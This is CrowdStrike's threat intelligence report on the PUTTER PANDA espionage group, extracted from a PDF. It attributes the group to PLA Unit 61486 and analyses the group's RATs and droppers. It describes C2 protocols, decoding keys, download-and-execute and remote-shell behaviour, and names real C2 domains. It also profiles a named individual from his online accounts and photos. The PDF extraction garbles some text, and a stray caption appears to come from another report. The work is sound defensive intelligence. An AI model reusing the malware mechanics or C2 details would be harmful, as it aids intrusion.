-vitation_Pleia-des_012012.docﬂ Dropped by a4e4b -3ceb949e8494968c-71fa840a516Figure 16. ﬁBien -venue_a_Sahaja_Yoga_ Toulouse.docﬂ Dropped by 4c50457c35e-2033b3a03fcbb4ad-ac7b7 37Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Figure 17. ﬁ50th AIAA Satellite Sciences Conference.pdfﬂ from 6022cf1f -cf2b478bed8da1fa3e-996ac5Figure 18: ﬁProj -ect-Manager-Job- Description-Sur-rey- Satellite-Tech-nology-world-lead -er-provision-small-sat -ellite-solutions. pdfﬂ Dropped by 9cb6103e9588d506cf-d81961ed41eefe Mitigation & Remediation 39Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) MITIGATION & REMEDIATION A number of speci˛c and generic detection methods are possible for this RAT , both on a host and on the network.

Although some of their tools are simplistic, taken as a whole their toolset provides a wide degree of control over a victim system and can provide the opportunity to deploy additional tools at will.Research presented in this report shows that the PU TT ER PANDA operators are likely members of the 12th Bureau, 3rd General Sta˚ Department (GSD) of the People™s Liberation Army (P LA ), operating from the unit™s headquarters in Shanghai with MUCD 61486. Strategic objectives for this unit are likely to include obtaining intellectual property and industrial secrets relating to defense technology, particularly those to help enable the unit™s suspect mission to conduct space surveillance, remote sensing, and interception of satellite communications. PUTT ER PANDA is likely to continue to aggressively target Western entities that hold valuable information or intellectual property relevant to these interests. The detection and mitigation guidance given in this report will help to minimize the risk of a successful compromise by these actors, and future Crowd Strike reports will examine other elements of the PU TT ER PANDA toolset.

      "'CrowdStrike Intelligence Report PUTTER PANDA This report is part of the series of technical and strategic reporting available to CrowdStrike Intelligence subscribers. It is being released publicly to expose a previously undisclosed PLA unit involved in cyberespionage against Western technology companies. CROWDSTRIKE GLOBAL INTELLIGENCE TEAM In May 2014, the U.S. Department of Justice charged ˜ve Chinese nationals for economic espionage against U.S. corporations. ˚e ˜ve known state actors are o˛cers in Unit 61398 of the Chinese People™s Liberation Army (PLA). In response, the Chinese government stated that the claims were ﬁabsurdﬂ and based on ﬁfabricated factsﬂ. China then went even further, stating ﬁ˚e Chinese government, the Chinese military and their relevant personnel have never engaged or participated in cyber the˝ of trade secrets.ﬂ We believe that organizations, be they governments or corporations, global or domestic, must keep up the pressure and hold China accountable until lasting change is achieved. Not only did the U.S. Government o˙er in its criminal indictment the foundation of evidence designed to prove China™s culpability in electronic espionage, but also illustrated that the charges are only the tip of a very large iceberg. ˚ose reading the indictment should not conclude that the People™s Republic of China (PRC) hacking campaign is limited to ˜ve soldiers in one military unit, or that they solely target the United States government and corporations. Rather, China™s decade-long economic espionage campaign is massive and unrelenting. ˚rough widespread espionage campaigns, Chinese threat actors are targeting companies and governments in every part of the globe. At CrowdStrike, we see evidence of this activity ˜rst-hand as our services team conducts Incident Response investigations and responds to security breaches at some of the largest organizations around the world. We have ˜rst-hand insight into the billions of dollars of intellectual property systematically leaving many of the largest corporations - o˝en times unbeknownst to their executives and boards of directors. ˚e campaign that is the subject of this report further points to espionage activity outside of Unit 61398, and reveals the activities of Unit 61486. Unit 61486 is the 12th Bureau of the PLA™s 3rd General Sta˙ Department (GSD) and is headquartered in Shanghai, China. ˚e CrowdStrike Intelligence team has been tracking this particular unit since 2012, under the codename PUTTER PANDA, and has documented activity dating back to 2007. ˚e report identi˜es Chen Ping, aka cpyy, and the primary location of Unit 61486. ˚is particular unit is believed to hack into victim companies throughout the world in order to steal corporate trade secrets, primarily relating to the satellite, aerospace and communication industries. With revenues totaling $189.2 billion in 2013, the satellite industry is a prime target for espionage campaigns that result in the the˝ of high-stakes intellectual property. While the gains from electronic the˝ are hard to quantify, stolen information undoubtedly results in an improved competitive edge, reduced research and development timetables, and insight into strategy and vulnerabilities of the targeted organization. Parts of the PUTTER PANDA toolset and tradecra˝ have been previously documented, both by CrowdStrike, and in open source, where they are referred to as the MSUpdater group. ˚is report contains details on the tactics, tools, and techniques used by PUTTER PANDA, and provides indicators and signatures that can be leveraged by organizations to protect themselves against this activity. Our Global Intelligence Team actively tracks and reports on more than 70 espionage groups, approximately half of which operate out of China and are believed to be tied to the Chinese government. ˚is report is part of our extensive intelligence library and was made available to our intelligence subscribers in April 2014, prior to the US Government™s criminal indictment and China™s subsequent refusal to engage in a constructive dialog. Targeted economic espionage campaigns compromise technological advantage, diminish global competition, and ultimately have no geographic borders. We believe the U.S. Government indictments and global acknowledgment and awareness are important steps in the right direction. In support of these e˙orts, we are making this report available to the public to continue the dialog around this ever-present threat.

The attribution provided in this report points to Chen Ping, aka cpyy (born on May 29, 1979), as an individual responsible for the domain registration for the Command and Control (C2) of PU TT ER PANDA malware. In addition to cpyy, the report identi˛es the primary location of Unit 61486. PUTT ER PANDA is a determined adversary group, conducting intelligence-gathering operations targeting the Government, Defense, Research, and Technology sectors in the United States, with speci˛c targeting of the U S Defense and European satellite and aerospace industries. The PLA ™s GSD Third Department is generally acknowledged to be China™s premier Signals Intelligence (SIGINT) collection and analysis agency, and the 12th Bureau Unit 61486, headquartered in Shanghai, supports China™s space surveillance network. Domains registered by Chen Ping were used to control PU TT ER PANDA malware. These domains were registered to an address corresponding to the physical location of the Shanghai headquarters of 12th Bureau, speci˛cally Unit 61486. The report illuminates a wide set of tools in use by the actors, including several Remote Access Tools (RAT s). The RAT s are used by the PU TT ER PANDA actors to conduct intelligence-gathering operations with a signi˛cant focus on the space technology sector. This toolset provides a wide degree of control over a victim system and can provide the opportunity to deploy additional tools at will. They focus their exploits against popular productivity applications such as Adobe Reader and Microso˝ O˙ce to deploy custom malware through targeted email attacks. This report contains additional details on the tactics, tools, and techniques used by PU TT ER PANDA, and provides indicators and signatures that can be leveraged by organizations to protect themselves against this activity. 5KEY FINDINGS Putter Panda is a cyber espionage actor that conducts operations from Shanghai, China, likely on behalf of the Chinese People™s Liberation Army (PLA ) 3rd General Sta˚ Department 12th Bureau Unit 61486. This unit is supports the space based signals intelligence (SIGINT) mission.The 12th Bureau Unit 61486, headquartered in Shanghai, is widely accepted to be China™s primary SIGINT collection and analysis agency, supporting China™s space surveillance network. This is a determined adversary group, conducting intelligence- gathering operations targeting the Government, Defense, Research, and Technology sectors in the United States, with speci˛c targeting of space, aerospace, and communications.The group has been operating since at least 2007 and has been observed heavily targeting the U S Defense and European satellite and aerospace industries. They focus their exploits against popular productivity applications such as Adobe Reader and Microso˝ O˙ce to deploy custom malware through targeted email attacks. Crowd Strike identi˛ed Chen Ping, aka cpyy, a suspected member of the PLA responsible for procurement of the domains associated with operations conducted by Putter Panda.There is infrastructure overlap with Comment Panda, and evidence of interaction between actors tied to both groups. Attribution 7ATTRIBUTION There are several pieces of evidence to indicate that the activity tracked by Crowd Strike as PU TT ER PANDA is attributable to a set of actors based in China, operating on behalf of the Chinese People™s Liberation Army (P LA ). Speci˛cally, an actor known as cpyy (Chen Ping) appears to have been involved in a number of historical PUTT ER PANDA campaigns, during which time he was likely working in Shanghai within the 12th Bureau, 3rd General Sta˚ Department (GSD). PUTT ER PANDA has several connections to actors and infrastructure tied to C OMMENT PANDA, a group previously attributed to Unit 61398 of the PLA . 8C2 INDICATORS Although some of the domains used for command and control of the tools described later in this report appear to be legitimate sites that have been compromised in some way, many of them appear to have been originally registered by the operators. Table 1 shows the domains that appear to have been registered by these actors, and the original email address used where known. Table 1. C2 Domains and Original Registrant Email Addresses 9C2 INDICATORS ˆCONT™DˇThe most signi˛cant ˛nding is that an actor known as cpyy appears to have registered a signi˛cant number of C2 domains. This actor is discussed in the next section. Many of the domains have had their registrant information changed, likely in an attempt to obfuscate the identity of the operators. For instance, several domains originally registered by cpyy had their email address updated to van.dehaim@gmail.com around the end of 2009; for siseau.com the change occurred between July 2009 and November 2009, and for vssigma.com, the change occurred between August 2009 and December 2009. Historical registrant information for anfoundation.us, rwchateau.com, and succourtion.org was not available prior to 2010, but it is likely that these domains were also originally registered to a personally attributable email account. Similarly, several domains registered to mike.johnson_mj@yahoo.com have had their registrant email updated during March 2014 (see Table 2). These registrant changes may indicate an increased awareness of operational security (OPSEC) from the PU TT ER PANDA actors. The recent changes to the domains shown in Table 2 may indicate that the operators are preparing new campaigns that make use of this infrastructure, or they are attempting to disassociate all these Although no attributable information was found on the email addresses associated with the domains described above (aside from cpyy and httpchen Œ see below), several other domains were found to have been registered by some of these addresses. These are shown in Table 3, and may be used for command and control of PU TT ER PANDA tools. domains from a single email address, perhaps due to OPSEC concerns or issues with the speci˛c email account. Table 2. New Registrant Email Addresses for Domains Original-ly Registered to mike.johnson_mj@ yahoo.com 10C2 INDICATORS ˆCONT™DˇTAR GETINGThe subdomains associated with these domains via DNS records, along with some of the domain names themselves, point to some areas of interest for the PU TT ER PANDA operators (see also Droppers in the following Technical Analysis section): sensing technology (particularly within Europe); aerospace companies; telecommunications. It is likely that PU TT ER PANDA will continue to attack targets of this nature in future intelligence- gathering operations. Table 3. Domains Associated with Registrant Emails Found in PUTT ER PANDA C2 Domains 11C2 INDICATORS ˆCONT™DˇCONNECTIONS TO OT HER ADVERSARY GROUP SCOMMENT PA NDABased on passive DNS records, several PU TT ER PANDA associated domains have resolved to IP address 100.42.216.230: Additionally, several subdomains of ujheadph.com resolved to this IP: Another subdomain of ujheadph.com has been observed2 in connection with distinctive tra˙c originating from the 3P ARA RAT (described below), making it probable that this domain is also associated with PUTT ER PANDA.The decipherment.net domains resolved to this IP address from 11 October 2012 to at least 25 February 2013, and the botanict.com domain resolved from 11 October 2012 to 24 March 2013. During part of this timeframe (30 June 2012 - 30 October 2012), a domain associated with COMMENT PANDA resolved to this same IP address: login. aolon1ine.com. Additionally, for a brief period in April 2012, update8.˛refoxupdata.com also resolved to this IP address. The use of the same IP address during the same time suggests that there is perhaps some cooperation or shared resources between C OMMENT PANDA and PUTT ER PANDA.VIXEN PA NDAAlthough not as conclusive as the links to COMMENT PANDA, IP address 31.170.110.163 was associated with VIXEN PANDA domain blog.strancorproduct.info from November to December 2013. In February 2014, this IP address was also associated with PUTT ER PANDA domain ske.hfmforum. com. While not directly overlapping, this potential infrastructure link is interesting, as VIXE N PANDA has previously displayed TT Ps similar to COMMENT PANDA (other Crowd Strike reporting describes VIXE N PANDA malware that extracts C2 commands embedded between delimiters in web content), and has extensively targeted European entities. 2See http://webcache.googleusercontent.com/search?q=cache:ZZyfzC1Y0UoJ:www.urlquery.net/report. php%3Fid%3D9771458+&cd=2&hl=en&ct=clnk&gl=uk 12 ﬁCPYYﬂSeveral email addresses have been associated with cpyy, who also appears to use the alternate handles cpiyy and cpyy.chen: The cpyy.net domain lists ﬁChen Pingﬂ as the registrant name, which may be cpyy™s real name, as this correlates with the initials ﬁcpﬂ in ﬁcpyyﬂ. A personal blog for cpyy was found at http://cpiyy.blog.163.com/.

A related C SDN pro˛le for user cpiyy indicates that cpyy was working on or studying these topics in 2002 and 20033.Another personal blog for cpyy (http://www.tianya.cn/1569234/bbs) appears to have last been updated in 2007. This states that the user lives in Shanghai, and has a birthdate identical to that in the 163.com blog.cpyy was also active on a social networking site called XCar, stating that he lived in Shanghai as early as 2005 through 2007; he said in a post, ﬁ Soldier™s duty is to defend the country, as long as our country is safe, our military is excellentﬂ4 , indicating a feeling of patriotism that could be consistent with someone who chose a military or police-based career.

Although super˛cially the discussion is about cars, there is a repeated word in the text, ﬁmilk yellow packageﬂ or ﬁcustard packageﬂ or ﬁyoke packageﬂ ( ). This could be a hacker slang word, but it is unclear as to the de˛nition. The conversation alludes to Linxder being the ﬁteacherﬂ or ﬁlandlordﬂ and the other aforementioned users are his ﬁstudentsﬂ. Linxder references how he has ﬁfound jobsﬂ for them. It is possible that this is a reference to hacking jobs wrapped up in car metaphors. Linxder is the handle of an actor associated with the likely Shanghai-based COMMENT PANDA group 5 . Linxder, cpyy, and xiaobai have all discussed programming and security related topics on cpyy™s site, cpyy.org 6 , which hosted a discussion forum for the 711 Network Security Team (see below).cpyy also appears to have a keen interest in photography; his 163.com blog includes several photographs taken by cpyy in the blog postings and albums section. Some of these photographs also appear in a Picasa site7 (examples are shown in Figures 5 and 6) belonging to a user cpyy.chen. An album in this site named ﬁmeﬂ has several shots of what is likely cpyy himself, from 2005, 2006, and 2007, shown to the right:Figure 4. cpyy.chen, from 2005, 2006, and 2007 (le˝ to right) 15 ﬁCPYYﬂ ˆCONT™DˇAn account on rootkit.com, a popular low-level so˝ware security site, existed for user cpyy and was accessed in at least May 2004. This account was registered with primary email address cpyy@cpyy.net and backup email address cpyy@hotmail.com; it listed a date of birth as 24 May 1979, consistent with cpyy™s other pro˛les. The IP address 218.242.252.214 was associated with this account; it is owned by the Oriental Cable Network Co., Ltd., an ISP located in Shanghai. Registration on this forum shows that cpyy had an interest in security-related programming topics, which is backed up by the postings on his personal blog and C SDN account. Figure 6.

Sample Photograph from cpyy.chen™s Picasa Albums 16 ﬁCPYYﬂ ˆCONT™Dˇ711 NETWOR K SECURITY T EAM One of the sites registered to cpyy was used to host a web-based email service, along with a forum on www. cpyy.net. Both of these services were apparently run by the 711 Network Security Team (711), a group that is now likely defunct, but has previously published security-based articles that have been re-posted on popular Chinese hacking sites such as xfocus.net8. One of these articles, entitled ﬁIMD-based packet ˛ltering ˛rewall to achieve the principlesﬂ 9, is apparently authored by xiaobai, with email address xiaobai@open˛nd.com.cn; it was published on the ﬁGRAT EFULﬂ ) security digest list10 that is hosted by Shanghai Jiao Tong University (SJTU). This digest list/bulletin board was also frequented by ClassicWind, an actor possibly linked to the Shanghai-based, PLA -sponsored adversary group COMMENT PANDA, as described in. This Tipper also indicates that ﬁthe Chinese Communist Party (CCP) and the People™s Liberation Army (P LA ) aggressively target SJTU and its School of Information Security Engineering (SISE) as a source of research and student recruitment to conduct network o˚ense and defense campaignsﬂ, so it is possible that the 711 Network Security Team members came to the attention of the Chinese state via this institution.An additional connection to SJTU comes from a C2 domain, checalla.com, used with the 4H RAT in 2008. This domain was registered to httpchen@gmail. com at the time, and this address was also used to make a posting on the G RAT EFUL BBS (shown in Figure 7). The posting indicates that httpchen is located at the (Minhang) campus of SJTU and was posting using IP address 58.196.156.15, which is associated with the China Education and Research Network (CE RNET), a nationwide network managed by the Chinese Ministry of Education. It also states that httpchen is studying at the school of Information Security Engineering within SJTU.8For example, hxxp://www.xfocus.net/articles/200307/568.html 9This article also lists http://cpyy.vicp.net/ as the original source site, although no archived content could be recovered for this. 10See http://bbs.sjtu.edu.cn/bbsanc,path,/groups/GROUP_3/Security/D44039356/D69C6D2AC/D4C11F438/D6DB67E4E/DA69FF663/ M.1052844461.A.htmlFigure 7. httpchen Posting on SJTU ﬁGRAT EFULﬂ BBS 17ﬁCPYYﬂ ˆCONT™DˇMILITARY CONNECTIONSSeveral pieces of evidence indicate that cpyy probably has connections to, or is part of, the Chinese military Œ speci˛cally the PLA Army. In addition to his declaration on his personal blog that he works for the ﬁmilitary/ policeﬂ, and contacts with actors such as Linxder that have been previously associated with hacking units within the PLA , cpyy™s Picasa site contains several photographs that hint at military connections. First, a monochrome picture from the (ﬁcollegeﬂ) album posted in February 2007 shows several uniformed individuals: It is not clear whether this picture includes cpyy, or just friends/ associates/relatives. A picture from the (ﬁhigh schoolﬂ) album posted in February 2007 shows a male Œ likely cpyy based on the clothing shown in the second picture, which matches the pictures of cpyy shown above Œ performing exercise in front of a group of likely soldiers and an o˙cer: 18Although somewhat unclear, pictures from the album 2002 (ﬁ2002 birthdayﬂ), also posted in February 2007, show the celebrant (likely cpyy) in khaki clothes that are possibly military wear. The most compelling pictures, however, are found in the and albums (ﬁdormitoryﬂ and ﬁo˙ceﬂ). A shot of probably cpyy™s dormitory room shows in the background two military hats that appear to be Type 07 PLA Army o˙cer peak hats: 19This album also contains a shot of the exterior of a building with several large satellite dishes outside: This same building and the satellite dishes also appear in the ﬁo˙ceﬂ album. The re˘ection e˚ects observed on the windows of this building could be due to coatings applied to resist eavesdropping via laser microphones and to increase privacy, which would be consistent with a military installation conducting sensitive work. 20Above is an image from the same album of what appears to be a larger dish, in front of the Oriental Pearl Tower, a signi˛cant landmark in Shanghai:UNIT 61486As mentioned above, checalla.com was used for command and control with the PU TT ER PANDA 4H RAT in 2008. This domain was registered to httpchen@gmail.com, and in May 2009 the domain registration details were updated to include a Registrant Address of ﬁshanghai yuexiulu 46 45 202#ﬂ. A search for this location reveals an area of Shanghai shown in Figure 8 12 .Figure 9 shows an enlargement of satellite imagery from within this area, depicting a facility containing several satellite dishes within green areas, sports courts and a large o˙ce building. 12Source: https://www.google.com/maps/place/31%C2%B017™18.0%22N+121%C2%B027™18.7%22E/@31.2882939,121.4554673,658m/ data=!3m1!1e3!4m2!3m1!1s0x0:0x0 21Figure 8.

Further con˛rmation can be found from photos uploaded by a user on Panoramio 13 who tags the image as being located in Chabei14 , Shanghai, China (31° 17™ 18.86ﬂ N 121° 27™ 9.83ﬂ E). This image is exceptionally similar to building shown in cpyy™s ﬁo˙ceﬂ album (see Figure 11 below). 13http://www.panoramio.com/user/3305909 14Alternately Romanized as Zhabei Figure 10. Satellite Imagery of Facility Alongside Handheld Image from cpyy 23According to a public report 15 on the Chinese PLA ™s General Sta˚ Department (GSD), the 12th Bureau of the 3rd G SD is headquartered in the Zhabei district of Shanghai and ﬁappears to have a functional mission involving satellites, likely inclusive of intercept of satellite communications and possibly space-based SIGINT collectionﬂ. The same report also lists a Military Unit Cover Designator (MUCD) of 61486 for this bureau. A webpage16 published on a Chinese government site detailing theatrical performances involving members of the PLA lists an address of ﬁ ﬂ (46 Yue Xiu Road, Zhabei District) for ﬁﬂ (61486 Forces General Sta˚). A search for this location shows an identical area to that shown in Figure 8. It can therefore be concluded with high con˛dence that the location shown in cpyy™s imagery, along with the satellite images above, is the headquarters of the 12th Bureau, 3rd G SD, Chinese PLA Œ also known as Unit 61486. This unit™s suspected involvement in ﬁspace surveillanceﬂ17 and ﬁintercept of satellite communicationsﬂ ˛ts with their observed targeting preferences for Western companies producing technologies in the space and imaging/remote sensing sectors. The size and number of dishes present in the area is also consistent with these activities. 15http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf 16http://www.dfxj.gov.cn/xjapp/wtzyps/wtlzy/wyyjysl/zhc/zyc/bd01d910153ffb4d0115a7c12f70042e.html 17http://project2049.net/documents/china_electronic_intelligence_elint_satellite_developments_easton_stokes.pdf Figure 11. Panoramio (le˝) and cpyy Images Compared 24BINARY INDICATORSObserved build times for the PUTT ER PANDA tools described in this report range from 2007 to late 2013, indicating that the actors have conducted several campaigns against their objectives over a period of several years. A build time analysis of all known samples is shown in Figure 1 below, relative to China time. Although this shows that there is some bias in the build time distribution to daylight or working hours in China, which is more signi˛cant if a possible three-shi˝ system of hours is considered (0900-1200, 1400-1700, and 2000-2300), this evidence is not conclusive. There is also some evidence that build times are manipulated by the adversary; for example, the sample with MD5 hash bc4e9dad71b844dd3233cfbbb96c1bd3 has a build time of 18 July 2013, but was supposedly ˛rst submitted to Virus Total on 9 January 2013. This shows that the attackers Œ at least in 2013 Œ were aware of some operational security considerations and were likely taking deliberate steps to hide their origins. Figure 1. Build Time Analysis of PUTT ER PANDA Malware, Relative to China Time (UTC+8) 25CONCLUSIONSThere is strong evidence to tie cpyy, an actor who appears to have been involved in historical PUTT ER PANDA operations, to the P LA army and a location in Shanghai that is operated by the 12th Bureau, 3rd G SD of the PLA (Unit 61486). Another actor tied to this activity, httpchen, has declared publically that he was attending the School of Information Security Engineering at SJTU. This university has previously been posited as a recruiting ground for the P LA to ˛nd personnel for its cyber intelligence gathering units, and there is circumstantial evidence linked cpyy to other actors based at SJTU.Given the evidence outlined above, Crowd Strike attributes the PUTT ER PANDA group to P LA Unit 61486 within Shanghai, China with high con˛dence. It is likely that this organization is sta˚ed in part by current or former students of SJTU, and shares some resources and direction with P LA Unit 61398 (COMMENT PANDA). Technical Analysis 27Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) TECHNICAL ANALYSISSeveral RAT s are used by PU TT ER PANDA. The most common of these, the 4H RAT and the 3PARA RAT , have been documented previously by Crowd Strike in previous Crowd Strike Intelligence reporting. This analysis will be revisited below, along with an examination of two other PUTT ER PANDA tools: pngdowner and httpclient. Two droppers have been associated with the PUTT ER PANDA toolset; these are also brie˘y examined below. 4H RAT Œ EXAMPLE MD5 HASH A76419A2FCA12427C887895E12A3442BThis RAT was ˛rst analyzed by Crowd Strike in April 2012, but a historical analysis shows that it has been in use since at least 2007 by the PUTT ER PANDA actors. A listing of metadata for known samples, including C2 information, is shown in Appendix 1.The operation of this RAT is described in detail in other Crowd Strike reporting, but is useful to revisit here to highlight the characteristics of the RAT : search?qu= at www.google.com). ldd46!yo , and ˛nally nibble-wise encoded as upper-case ASCII characters in the range ( A-P) Œ e.g., the byte value 0x1F becomes ﬁBPﬂ.

Sample Python Code to Decode Hostname from User- Agent Snippet3PARA RAT Œ EXAMPLE MD5 HASH BC4E9DAD71B844DD3233CFBBB96C1BD3The 3PARA RAT was described in some detail in other Crowd Strike reporting, which examined a DLL-based sample with an exported ˛lename of ssdpsvc.dll. Other observed exported ˛lenames are msacem.dll and mrpmsg.dll, although the RAT has also been observed in plain executable (EXE) format. On startup, the RAT attempts to create a ˛le mapping named &*SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf. This is used to prevent multiple instances of the RAT being executed simultaneously. The RAT will then use a byte-wise subtraction- based algorithm (using a hard-coded modulo value) to decode C2 server details consisting of a server hostname and port number, in this example nsc.adomhn. com, port 80. The decoding algorithm is illustrated in Figure 10 below. The key and modulo values vary on a per-sample basis. Decoded C2 settings, along with sample metadata, are listed in Appendix 2. 29Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Figure 11. 3P ARA RAT Initial BeaconFigure 10. Sample Python Code Illus-trating C2 Server Decoding RoutineThe RAT is programmed in C++ using Microso˝ Visual Studio, and it makes use of the object-oriented and parallel programming features of this environment; Standard Template Library ( STL) objects are used to represent data structures such as strings and lists, and custom objects are used to represent some of the C2 command handlers (e.g., CCommandCMD). Several threads are used to handle di˚erent stages of the C2 protocol, such as receiving data from the server, decrypting data, and processing commands. Standard Windows primitives such as Events are used to synchronize across these threads, with a shared global structure used to hold state. Once running, the RAT will load a binary representation of a date/time value 13 from a ˛le C:\\\\RECYCLER\\\\restore.dat, and it will sleep until a˝er this date/time has passed. This provides a mechanism for the operators to allow the RAT to remain dormant until a ˛xed time, perhaps to allow a means of regaining access if other parts of their toolset are removed from a victim system. As with the 4H RAT , the C2 protocol used by the 3P ARA RAT is HTT P based, using both GET and POST requests. An initial request is made to the C2 server (illustrated in Figure 11 above), but the response value is e˚ectively ignored; it is likely that this request serves only as a connectivity check, as further C2 activity will only occur if this ˛rst request is successful. In this case, the RAT will transmit some basic victim information to the C2 server along with a 256-byte hash of the hard-coded string HYF54&%9&jkMCXuiS. It is likely that this request functions as a means to authenticate the RAT to the C2 server and register a new victim machine with the controller. A sample request and its structure are shown in Figure 12. 13Using the standard Windows SYSTEMTIME structure 30Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Figure 12. Sample 3PARA RAT Second-ary Beacon/C2 Registration 14See http://msdn.microsoft.com/en-us/library/windows/desktop/bb759853(v=vs.85).aspx for details of this API, which is rarely used. 31Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Figure 13. 3P ARA RAT Sample Tasking RequestIf this request is also successful, the RAT will attempt to retrieve tasking from the controller using a further distinctive H TT P request shown in Figure 13, repeating this request every two seconds until valid tasking is returned. 32Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Returned tasking is decrypted using the DES algorithm in CBC mode with a key derived from the M D5 hash of the string HYF54&%9&jkMCXuiS (as used in the secondary beacon shown above). If this fails, the RAT will fall back to decoding the data using an 8-byte XOR with a key derived from data returned from the Hash Data API with the same key string. Output data produced by tasking instructions is encrypted in the same manner as it was decrypted and sent back to the C2 server via HTT P POST request to a U RI of the form /microso˝/errorpost/ default.aspx?I D=, where the I D value is a random number in decimal representation Œ as with the initial request shown in Figure 4. The set of commands supported by the RAT is somewhat limited, indicating that perhaps the RAT is intended to be used as a second-stage tool, or as a failsafe means for the attackers to regain basic access to a compromised system (which is consistent with its support for sleeping until a certain date/time). Some of the supported commands are implemented using C++ classes derived from a base CCommand class: modi˛cation timestamps. redirected over the C2 channel. However, other commands are not implemented in this way. These other commands contain functionality to: restore.dat as noted above. The use of C++ classes that inherit from a base class to carry out some of the tasking commands, along with the use of concurrency features, indicates that the developers of the RAT put some thought into the architecture and design of their tool, although the decision to implement some commands outside of the class-based framework is curious, and may indicate multiple developers worked on the RAT (or a single developer with shi˝ing preferences for his coding style). 33Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) PNGDOWNER Œ EXAMPLE MD5 HASH 687424F0923DF9049CC3A56C685EB9A5The pngdowner malware is a simple tool constructed using Microso˝ Visual Studio and implemented via single C++ source code ˛le. This sample contains a PDB path of Y:\\\\Visual Studio 2005\\\\Projects\\\\branch-downer\\\\ downer\\\\Release\\\\downer.pdb, but other similar paths Z:\\\\Visual Studio 2005\\\\Projects\\\\pngdowner\\\\ Release\\\\ pngdowner.pdb and Z:\\\\Visual Studio 2005\\\\Projects\\\\downer\\\\ Release\\\\downer.pdb have also been observed in other samples. Appendix 3 lists metadata for known pngdowner samples.Initially, the malware will perform a connectivity check to a hard-coded U RL (http://www.microso˝.com), using a constant user agent Mozilla/4.0 (Compatible; MSIE 6.0;). If this request fails, the malware will attempt to extract proxy details and credentials from Windows Protected Storage, and from the IE Credentials Store using publicly known methods15 , using the proxy credentials for subsequent requests if they enable outbound H TT P access. An initial request is then made to the hard-coded C2 server and initial U RI Œ forming a U RL of the form (in this sample) http://login.stream-media.net/˛les/xx11/index.asp?95027775, where the numerical parameter represents a random integer. A hard-coded user agent of my Agent is used for this request, and subsequent communication with the C2 server. Content returned from this request to the C2 server will be saved to a ˛le named index.dat in the user™s temporary directory (i.e., % TEMP%). This ˛le is expected to contain a single line, specifying a U RL and a ˛lename. The malware will then attempt to download content from the speci˛ed U RL to the ˛lename within the user™s temporary directory, and then execute this ˛le via the WinExec API. If this execution attempt succeeds, a ˛nal C2 request will be made Œ in this case to a U RL using the same path as the initial request (and a similarly random parameter), but with a ˛lename of success.asp. Content returned from this request will be saved to a ˛le, but then immediately deleted. Finally, the malware will delete the content saved from the ˛rst request, and exit. The limited functionality, and lack of persistence of this tool, implies that it is used only as a simple download-and-execute utility. Although the version mentioned here uses C++, along with Visual Studios Standard Template Library ( STL), older versions of the RAT (such as MD5 hash b54e91c234ec0e739ce429f47a317313), built in 2011, use plain C. This suggests that despite the simple nature of the tool, the developers have made some attempts to modify and perhaps modernize the code. Both versions contain debugging/progress messages such as ﬁdown ˛le successﬂ. Although these are not displayed to the victim, they were likely used by the developers as a simple means to verify functionality of their code. 34Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) HTT PCLIENT Œ EXAMPLE MD5 HASH 544FCA6EB8181F163E2768C81F2BA0B3Like pngdowner, the httpclient malware is a simple tool that provides a limited range of functionality and uses HTT P for its C2 channel. This malware also initially performs a connectivity check to www.microso˝.com using the hard-coded user agent Mozilla/4.0 (Compatible; M SIE 6.0;), although in this variant no attempt is made to extract proxy credentials. The malware will then connect to its con˛gured C2 infrastructure (˛le.anyo˙ce.info) and perform a H TT P request of the form shown in Figure 14 below: Content returned from the C2 server is deobfuscated by X OR™ing the content with a single byte, 0x12. The decoded data is then checked for the string runshell. If this string is not present, the C2 request is repeated every 0.5 seconds. Otherwise, a shell process is started (i.e., cmd.exe), with input/output redirected over the C2 channel. Shell commands from the server are followed by an encoded string $$$, which indicates that the shell session should continue. If the session is ended, two other commands are supported: m2b (upload ˛le) and b2m (download ˛le). Slight variations on the C2 URLs are used for di˚erent phases of the C2 interaction: Shell command: /Microso˝/errorpost<random number>/default.asp?tmp=<encoded hostname> /Microso˝Update/GetUpdate/KB<random number>/default.asp?tmp=<encoded hostname> 15Both methods are detailed here: http://securityxploded.com/iepasswordsecrets.php Figure 14. HttpClient Sample Beacon 35Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Given the lack of a persistence mechanism and low level of sophistication, it is likely that httpclient Œ like pngdowner Œ is used as a second-stage or supplementary/backup tool. Appendix 4 lists metadata for observed httpclient samples.DROPPERS Œ RC4 AND XOR BASEDOther Crowd Strike reporting describes a dropper used by PU TT ER PANDA (abc.scr) to install the 4H RAT . This dropper uses RC4 to decrypt an embedded payload from data in an embedded resource before writing the payload to disk and executing it. Several instances of this dropper have been observed, most commonly in association with the 4H RAT , but also in relation to other tools that will be described in forthcoming reporting. Another dropper has been observed, exclusively installing the pngdowner malware (example M D5 hash 4c50457c35e2033b3a03fcbb4adac7b7). This dropper is simplistic in nature, and is compiled from a single C++ source code ˛le. It contains a Word document in plaintext (written to Bienvenue_a_ Sahaja_Yoga_ Toulouse.doc), along with an executable (Update.exe) and DLL (McUpdate.dll). The executable and DLL are both contained within the .data section of the dropper, obfuscated with a 16-byte X OR key (consisting of the bytes 0xA0 Œ 0xAF).Both the document and executable are written to disk and the executed via the ShellExecute API (using the verb ﬁopenﬂ). The executable is also installed into the ASEP registry key HKCU\\\\ So˝ware\\\\Microso˝\\\\Windows\\\\ CurrentVersion\\\\ Run, with a value named McUpdate. Finally, the dropper deletes itself via a batch ˛le. The dropped executable (M D5 hash 38a2a6782e1af29ca8cb691cf0d29a0d) primarily aims to inject the speci˛ed DLL (McUpdate.dll, MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f) into a process that would normally be accessing the network, likely in order to disguise the malicious activity. Module names corresponding to Outlook Express (msinm.exe), 